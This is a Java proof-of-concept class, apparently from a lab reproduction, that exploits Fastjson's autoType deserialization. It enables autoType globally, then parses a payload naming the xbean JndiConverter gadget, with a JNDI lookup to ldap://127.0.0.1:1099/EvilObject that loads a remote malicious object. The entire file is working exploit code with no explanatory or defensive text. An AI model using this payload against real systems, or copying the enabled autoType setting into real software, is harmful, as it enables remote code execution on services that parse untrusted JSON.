import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.xbean.propertyeditor.JndiConverter;

public class Exp {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\"," +
                "\"AsText\":\"ldap://127.0.0.1:1099/EvilObject\"}";
        JSON.parse(poc);
    }
}